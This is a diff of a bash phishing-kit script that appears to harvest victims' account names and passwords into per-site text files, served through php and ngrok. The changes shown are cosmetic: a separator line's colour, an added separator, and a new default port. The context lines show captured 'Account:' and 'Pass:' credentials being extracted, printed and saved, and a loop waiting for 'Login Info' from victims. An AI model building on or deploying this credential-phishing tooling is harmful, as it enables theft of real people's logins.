@@ -378,7 +378,7 @@ account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 cat sites/$server/usernames.txt
-printf "\e[1;33m___________________________________________________________\e[0m\n" 
+printf "\e[1;30m________________________________________________________\e[0m\n" 
 printf "\e[1;33m[\e[0m\e[1;77m*\e[0m\e[1;33m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -520,7 +520,7 @@ fi
 if [[ -e sites/$server/usernames.txt ]]; then
 rm -rf sites/$server/usernames.txt
 fi
-def_port="5555"
+def_port="8080"
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
@@ -656,6 +656,7 @@ exit 1
 found() {
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\e[1;30m________________________________________________________\e[0m\n" 
 printf "\n"
 while [ true ]; do
 if [[ -e "sites/$server/ip.txt" ]]; then
